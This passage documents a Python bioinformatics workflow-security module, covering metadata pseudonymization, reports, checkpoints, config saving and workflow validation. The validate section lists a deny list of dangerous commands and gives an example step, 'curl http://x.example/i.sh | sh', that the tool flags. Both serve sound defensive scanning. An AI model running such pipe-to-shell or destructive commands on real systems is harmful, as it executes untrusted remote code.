- **Input:** `input`: a mapping, a list of mappings, or JSON text of one of them; anything else raises `InputFormatError` (codes `INVALID_METADATA_INPUT`, `INVALID_METADATA_JSON`, `UNSUPPORTED_METADATA_VALUE`, `METADATA_TOO_DEEP`, each with a `hint`). `options`: `mode` (`"redact"` | `"drop"` | `"hash"`, default `"redact"`), `salt` (string of at least 8 characters, required for `hash`), `digest_chars` (8 to 64, default 16, `hash` only), `keys` (extra sensitive key names, a string or list), `keep` (key names never treated as sensitive), `scan_text` (default `True`), `backend` (label only). Invalid options raise `ConfigurationError` (`PSEUDONYMIZE_SALT_REQUIRED`, `INVALID_PSEUDONYMIZE_MODE`, `INVALID_DIGEST_CHARS`, `INVALID_PSEUDONYMIZE_KEYS`, `INVALID_PSEUDONYMIZE_OPTIONS`).

- **Output:** The standard envelope: `status` (`"ok"`), `module` (`"workflow_security"`), `operation` (`"pseudonymize_metadata_fields"`), `provenance` (`implementation` `"native"`, `backend`), `input_summary`, `warnings` and `result`. `input_summary` deliberately holds only `record_count` and `n_keys` (number of mapping keys visited): no length and no SHA-256 of the unprotected input. `result` has `metadata` (the transformed mapping or list; JSON text input is returned parsed), `mode`, `n_redacted` (= `n_key_matches` + `n_text_matches`), `n_key_matches`, `n_text_matches`, `text_matches_by_pattern`, `redacted_paths` (JSON-path-like key paths such as `$.visits[0].dob`, never values; at most 10000, `redacted_paths_truncated` tells if more existed) and `warnings`. The warnings always say that the method is key-name and pattern based, is NOT a guarantee of de-identification, does not shift or generalise dates, ages over 89 or small geographic units, that free text may still identify a person, and that the output must be reviewed before sharing; the same list is in `result.warnings` and the envelope `warnings`. Neither the salt nor any original value appears anywhere in the output.

- **Example code:**

```python
import json
from dnakit.workflow_security import pseudonymize_metadata_fields

metadata = {
    "name": "Ada Lovelace",
    "patient_id": "P-001",
    "Email": "ada@example.org",
    "age": 36,
    "visit": {
        "name": "Ada Lovelace",
        "note": "call +1 (415) 555-0100 or ada@example.org, SSN 123-45-6789",
    },
}

# default: values of sensitive keys at any depth become "[REDACTED]"; patterns inside text are replaced
result = pseudonymize_metadata_fields(metadata)
print(json.dumps(result, indent=2))

# keyed hash: deterministic tokens that depend on a secret salt (required, >= 8 characters)
hashed = pseudonymize_metadata_fields(metadata, options={"mode": "hash", "salt": "example-salt-123", "digest_chars": 12})
print(json.dumps(hashed["result"]["metadata"], indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "pseudonymize_metadata_fields",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {
    "record_count": 1,
    "n_keys": 7
  },
  "warnings": [
    "Pseudonymisation is key-name and pattern based only. It is NOT a guarantee of de-identification and does not by itself satisfy HIPAA or GDPR requirements.",
    "Dates are not shifted or generalised; ages over 89 and small geographic units are not generalised.",
    "Free text may still identify a person: only e-mail, phone and SSN-like patterns are scanned, names and other identifiers inside text are not detected; dictionary keys that themselves contain identifiers are not rewritten.",
    "Review the output manually before sharing it."
  ],
  "status": "ok",
  "result": {
    "metadata": {
      "name": "[REDACTED]",
      "patient_id": "[REDACTED]",
      "Email": "[REDACTED]",
      "age": 36,
      "visit": {
        "name": "[REDACTED]",
        "note": "call [REDACTED:phone] or [REDACTED:email], SSN [REDACTED:ssn]"
      }
    },
    "mode": "redact",
    "n_redacted": 7,
    "n_key_matches": 4,
    "n_text_matches": 3,
    "text_matches_by_pattern": {
      "email": 1,
      "phone": 1,
      "ssn": 1
    },
    "redacted_paths": [
      "$.name",
      "$.patient_id",
      "$.Email",
      "$.visit.name",
      "$.visit.note"
    ],
    "redacted_paths_truncated": false,
    "warnings": [
      "Pseudonymisation is key-name and pattern based only. It is NOT a guarantee of de-identification and does not by itself satisfy HIPAA or GDPR requirements.",
      "Dates are not shifted or generalised; ages over 89 and small geographic units are not generalised.",
      "Free text may still identify a person: only e-mail, phone and SSN-like patterns are scanned, names and other identifiers inside text are not detected; dictionary keys that themselves contain identifiers are not rewritten.",
      "Review the output manually before sharing it."
    ]
  }
}
{
  "name": "69272bf887f1",
  "patient_id": "61df4f560250",
  "Email": "0e934605ef5f",
  "age": 36,
  "visit": {
    "name": "69272bf887f1",
    "note": "call [REDACTED:phone] or [REDACTED:email], SSN [REDACTED:ssn]"
  }
}
```

## 18) report

- **Purpose:** Summarize a workflow specification (validity, execution order, findings, resource estimate) as Markdown or JSON.

- **Method:** Built from the same checks as `validate` (dependency analysis and the secret/command/path scan) and `estimate` (as-soon-as-possible schedule, default 1 cpu and 0 for the other resources); the estimate section is omitted when no valid order exists or a resource value is invalid.

- **API:** `dnakit.workflow_security.report(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: workflow specification (mapping, JSON/YAML text or file path). `options`: `format` (`"markdown"` default or `"json"`; anything else raises `ConfigurationError`).

- **Output:** Envelope with `status: "ok"`, `module`, `operation`, `provenance`, `input_summary`, `warnings` and `result`; `result` has `format`, `valid` and `report` (the Markdown text, or with `format: "json"` a mapping with `name`, `source`, `valid`, `step_count`, `order`, `findings`, `estimate`).

- **Example code:**

```python
import json
from dnakit.workflow_security import report

workflow = {
    "name": "demo",
    "steps": [
        {"id": "qc", "command": ["fastqc", "reads.fq"], "cpus": 2, "memory_mb": 100, "runtime_s": 10},
        {"id": "align", "command": ["bwa", "mem", "ref.fa", "reads.fq"], "depends_on": ["qc"], "cpus": 4, "memory_mb": 800, "runtime_s": 60},
        {"id": "report", "command": ["multiqc", "."], "depends_on": ["align"], "runtime_s": 5},
    ],
}
result = report(workflow)
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "report",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "format": "markdown",
    "valid": true,
    "report": "# Workflow report: demo\n\n- source: inline\n- steps: 3\n- valid: yes\n\n## Execution order\n\n1. qc\n2. align\n3. report\n\n## Findings\n\n(none)\n\n## Resource estimate\n\n- wall time: 75.0 s\n- total cpu time: 265.0 cpu-s\n- peak cpus: 4.0\n- peak memory: 800.0 MB\n- critical path: qc -> align -> report\n"
  }
}
```

## 19) resume

- **Purpose:** Resume from a verified checkpoint, or resume a DNAKit workflow run from its manifest.

- **Method:** If `input` is a `dnakit-checkpoint-v1` document, its `state_sha256` is re-computed from `state`; a mismatch raises `InputFormatError` (`CHECKPOINT_CORRUPT`). Otherwise `input` must be the path of a DNAKit workflow file and `dnakit.workflows.run_workflow(path, resume=True)` is called (only built-in deterministic operations run, never commands).

- **API:** `dnakit.workflow_security.resume(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: a checkpoint (mapping, JSON text or file path) or the path of a DNAKit workflow file. `options` is unused.

- **Output:** Envelope with `status: "ok"`, `module`, `operation`, `provenance`, `input_summary`, `warnings` and `result`; for a checkpoint `result` has `kind: "checkpoint"`, `valid`, `step`, `created_at` and `state`; for a workflow file `result` is `{"kind": "workflow", ...}` plus the run result (`run_id`, `status`, `resumed`, `steps`, `artifacts`, ...) and `provenance.implementation` is `dnakit.workflows.run_workflow`.

- **Example code:**

```python
import json
from dnakit.workflow_security import checkpoint, resume

document = checkpoint({"done": ["qc"]}, options={"step": "after_qc", "timestamp": "2026-01-01T00:00:00+00:00"})["result"]["checkpoint"]
result = resume(document)
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "resume",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "kind": "checkpoint",
    "valid": true,
    "step": "after_qc",
    "created_at": "2026-01-01T00:00:00+00:00",
    "state": {
      "done": [
        "qc"
      ]
    }
  }
}
```

## 20) retry

- **Purpose:** Not implemented: retrying means executing a failed job again, and no user command is ever executed here.

- **Method:** No computation is performed. Use `resume` to continue a DNAKit workflow or a checkpoint.

- **API:** `dnakit.workflow_security.retry(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: any value (it is only summarized in `input_summary`); `options` is unused.

- **Output:** Always returns the envelope with `status: "not_implemented"`, `required_dependency` ("an execution backend that owns the failed job") and a `message` (Use resume to continue a DNAKit workflow or checkpoint; re-running arbitrary jobs is not supported.); no `result`. It never raises for a normal call.

- **Example code:**

```python
import json
from dnakit.workflow_security import retry

result = retry("job-42")
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "retry",
  "provenance": {
    "implementation": "not_implemented",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "not_implemented",
  "required_dependency": "an execution backend that owns the failed job",
  "message": "Use resume to continue a DNAKit workflow or checkpoint; re-running arbitrary jobs is not supported."
}
```

## 21) run

- **Purpose:** Run a DNAKit workflow file with the built-in deterministic operations (no commands, no network).

- **Method:** The file is a JSON/YAML workflow in the `dnakit-workflow-v1` schema (see `dnakit.workflows.load_workflow`); it is executed by `dnakit.workflows.run_workflow` and writes only into the workflow's own `output_dir`. With `dry_run` the workflow is validated and planned without writing anything.

- **API:** `dnakit.workflow_security.run(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: path of the workflow file (anything else raises `InputFormatError`). `options`: `dry_run` (default false).

- **Output:** Envelope with `status: "ok"`, `module`, `operation`, `provenance`, `input_summary`, `warnings` and `result` (`provenance.implementation` is `dnakit.workflows.run_workflow`); `result` is the run result: `run_id`, `status` (`dry-run` or `succeeded`), `dry_run`, `resumed`, `spec_sha256`, `input_sha256`, `output_dir`, `manifest_path`, `manifest_artifact`, `steps` and `artifacts`. In the example the absolute `output_dir` is replaced by `/path/to/work/out`.

- **Example code:**

```python
import json
from dnakit.workflow_security import run

open("input.fasta", "w").write(">one\nACGT\n")
config = {
    "schema_version": "dnakit-workflow-v1",
    "run_id": "r1",
    "input": {"path": "input.fasta", "format": "fasta", "alphabet": "iupac"},
    "output_dir": "out",
    "seed": 1,
    "error_policy": "raise",
    "overwrite": False,
    "steps": [{"id": "n", "operation": "normalize", "input": "input",
               "params": {"keep_ambiguous": True, "keep_u": False, "keep_other": False}}],
}
open("wf.json", "w").write(json.dumps(config))
result = run("wf.json", options={"dry_run": True})
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "run",
  "provenance": {
    "implementation": "dnakit.workflows.run_workflow",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "run_id": "r1",
    "status": "dry-run",
    "dry_run": true,
    "resumed": false,
    "spec_sha256": "e9473c3fbc03c5dfbfd14fea30fe7228a11d8f77ba7db134058c9f2e3b37f643",
    "input_sha256": "fc4994f16af758c46d6ac71d0807d25b3b2ca2390e7de18d598bfb9f5dde6b98",
    "output_dir": "/path/to/work/out",
    "manifest_path": null,
    "manifest_artifact": null,
    "steps": [
      {
        "id": "n",
        "operation": "normalize",
        "input_ref": "input",
        "status": "planned",
        "params": {
          "keep_ambiguous": true,
          "keep_u": false,
          "keep_other": false
        },
        "started_at": null,
        "finished_at": null,
        "input_sha256": null,
        "record_count": null,
        "summary": {
          "execution": "not started"
        },
        "artifacts": [],
        "error": null
      }
    ],
    "artifacts": []
  }
}
```

## 22) save_config

- **Purpose:** Save a configuration mapping as canonical pretty JSON, refusing configurations that contain secrets.

- **Method:** Unless `allow_secrets` is true, credential-looking text (AWS key ids, private-key blocks, GitHub/Slack tokens, bearer tokens, `password=...`-style assignments) raises `ConfigurationError` (`SECRET_IN_CONFIG`); the message masks the value. The file is written atomically with sorted keys, 2-space indent and a trailing newline; NaN or non-JSON values raise `InputFormatError`.

- **API:** `dnakit.workflow_security.save_config(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: a JSON-serializable mapping. `options`: `output` (required file path, otherwise `ConfigurationError`), `overwrite` (default false), `allow_secrets` (default false).

- **Output:** Envelope with `status: "ok"`, `module`, `operation`, `provenance`, `input_summary`, `warnings` and `result`; `result` has `path`, `bytes` and `sha256` of the file content.

- **Example code:**

```python
import json
from dnakit.workflow_security import save_config

result = save_config({"threads": 4, "reference": "GRCh38"}, options={"output": "config.json"})
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "save_config",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "path": "config.json",
    "bytes": 44,
    "sha256": "61231a6206b26da8c02f82d73113d30fbc65a693a883e2dd65d2183d4702a44d"
  }
}
```

## 23) set_random_seed

- **Purpose:** Seed Python's `random` (and NumPy / PyTorch when available) with one integer for reproducible runs.

- **Method:** `random.seed` is always applied; `numpy.random.seed` when NumPy is installed; `torch.manual_seed` only if PyTorch is already imported in the process. This changes global interpreter state by design. `PYTHONHASHSEED` cannot be changed after start-up and is only reported.

- **API:** `dnakit.workflow_security.set_random_seed(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: an integer seed in [0, 2**32 - 1] (booleans, other types and out-of-range values raise `InputFormatError`). `options`: `seed`, which takes precedence over `input`.

- **Output:** Envelope with `status: "ok"`, `module`, `operation`, `provenance`, `input_summary`, `warnings` and `result`; `result` has `seed`, `seeded` (the libraries seeded, e.g. `["random", "numpy"]`) and `python_hash_seed` (the current `PYTHONHASHSEED`, or `null`).

- **Example code:**

```python
import json
from dnakit.workflow_security import set_random_seed

result = set_random_seed(42)
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "set_random_seed",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "seed": 42,
    "seeded": [
      "random",
      "numpy"
    ],
    "python_hash_seed": null
  }
}
```

## 24) submit_cloud_job

- **Purpose:** Not implemented: submitting a cloud job needs a cloud account, credentials and a provider SDK.

- **Method:** No computation is performed; no cloud backend is configured, and `workflow_security` does not execute user commands remotely either.

- **API:** `dnakit.workflow_security.submit_cloud_job(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: any value (it is only summarized in `input_summary`); `options` is unused.

- **Output:** Always returns the envelope with `status: "not_implemented"`, `required_dependency` ("cloud provider credentials and SDK (AWS Batch, Google Batch, Azure Batch, ...)") and a `message` (No cloud backend is configured, and workflow_security does not execute user commands remotely either.); no `result`. It never raises for a normal call.

- **Example code:**

```python
import json
from dnakit.workflow_security import submit_cloud_job

result = submit_cloud_job({"image": "biocontainers/fastqc", "command": ["fastqc", "reads.fq"]})
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "submit_cloud_job",
  "provenance": {
    "implementation": "not_implemented",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "not_implemented",
  "required_dependency": "cloud provider credentials and SDK (AWS Batch, Google Batch, Azure Batch, ...)",
  "message": "No cloud backend is configured, and workflow_security does not execute user commands remotely either."
}
```

## 25) submit_hpc_job

- **Purpose:** Not implemented: submitting an HPC job means running `sbatch`/`qsub` on a cluster with a user-provided script.

- **Method:** No computation is performed; `workflow_security` never executes user commands.

- **API:** `dnakit.workflow_security.submit_hpc_job(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: any value (it is only summarized in `input_summary`); `options` is unused.

- **Output:** Always returns the envelope with `status: "not_implemented"`, `required_dependency` ("a cluster scheduler (sbatch, qsub, bsub) on PATH") and a `message` (Job submission executes a user script through a scheduler; workflow_security never executes user commands.); no `result`. It never raises for a normal call.

- **Example code:**

```python
import json
from dnakit.workflow_security import submit_hpc_job

result = submit_hpc_job({"script": "run.sh", "queue": "short"})
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "submit_hpc_job",
  "provenance": {
    "implementation": "not_implemented",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "not_implemented",
  "required_dependency": "a cluster scheduler (sbatch, qsub, bsub) on PATH",
  "message": "Job submission executes a user script through a scheduler; workflow_security never executes user commands."
}
```

## 26) validate

- **Purpose:** Validate a workflow specification: structure, dependency graph (unknown ids, cycles) and a security scan.

- **Method:** Structure: non-empty steps with unique ids matching `[A-Za-z0-9][A-Za-z0-9_.-]{0,63}`; `command` a non-empty string or list of strings; `cpus` > 0 and `memory_mb`/`runtime_s`/`disk_mb` >= 0; `depends_on` references existing steps, no self-dependency, no cycle (a concrete cycle path is reported). Security scan: dangerous commands by regular expression (`rm -rf /`, `curl|sh`, fork bomb, `dd of=/dev/..`, `mkfs`, `sudo`, `chmod 777`; errors), shell metacharacters in string commands (warning), literal credentials (AWS key ids, private-key blocks, GitHub and Slack tokens, bearer tokens, `password=...`-style assignments, secret-named `env` values; secrets are masked in messages), and paths with `..` or in sensitive locations such as `/etc` or `~/.ssh` (errors) or absolute paths (warning). This is a pattern scan, not a proof of safety.

- **API:** `dnakit.workflow_security.validate(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: workflow specification (mapping, JSON/YAML text or file path; `steps` may be a list or a mapping `id -> step`; `needs` is accepted as an alias of `depends_on`). `options`: `security` (default true; false skips the security scan).

- **Output:** Envelope with `status: "ok"`, `module`, `operation`, `provenance`, `input_summary`, `warnings` and `result`; findings are reported in `result`, not raised: `valid` (no error), `errors` and `warnings` (each `{severity, code, step, message}`), `order` (topological order or `null`), `step_count`, `sha256` and `source`.

- **Example code:**

```python
import json
from dnakit.workflow_security import validate

workflow = {
    "steps": [
        {"id": "a", "command": ["echo", "hi"], "depends_on": ["b"]},
        {"id": "b", "command": "curl http://x.example/i.sh | sh", "depends_on": ["a"]},
    ],
}
result = validate(workflow)
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "validate",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "valid": false,
    "errors": [
      {
        "severity": "error",
        "code": "CYCLE",
        "step": null,
        "message": "dependency cycle: a -> b -> a"
      },
      {
        "severity": "error",
        "code": "PIPE_TO_SHELL",
        "step": "b",
        "message": "command matches a dangerous-command rule"
      }
    ],
    "warnings": [
      {
        "severity": "warning",
        "code": "SHELL_METACHARACTERS",
        "step": "b",
        "message": "string command contains shell metacharacters; use a list-form argv"
      }
    ],
    "order": null,
    "step_count": 2,
    "sha256": "0c3669dff02a4ac07ec072f58bbd000654b9738053a5715e4dc92d9b2e4df126",
    "source": "inline"
  }
}
```

## 27) write

- **Purpose:** Serialize a workflow specification to JSON or YAML text, optionally writing it to a file.

- **Method:** JSON is canonical (sorted keys, 2-space indent, trailing newline); YAML uses `yaml.safe_dump` with sorted keys. A file is written only when `output` is given, atomically; an existing file raises `ConfigurationError` unless `overwrite` is true.

- **API:** `dnakit.workflow_security.write(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: a mapping (or JSON/YAML text or a file path that parses to one). `options`: `format` (`"json"` default or `"yaml"`), `output` (file to write), `overwrite` (default false).

- **Output:** Envelope with `status: "ok"`, `module`, `operation`, `provenance`, `input_summary`, `warnings` and `result`; `result` has `format`, `text`, `sha256` (of the text) and `path` (the written file or `null`).

- **Example code:**

```python
import json
from dnakit.workflow_security import write

result = write({"name": "demo", "steps": [{"id": "qc", "command": ["fastqc", "reads.fq"]}]}, options={"format": "yaml"})
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "write",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "format": "yaml",
    "text": "name: demo\nsteps:\n- command:\n  - fastqc\n  - reads.fq\n  id: qc\n",
    "sha256": "6ae77919a6927bf19253b6fcbc48c41490a49744db86149c8b916a40fde4c436",
    "path": null
  }
}
```
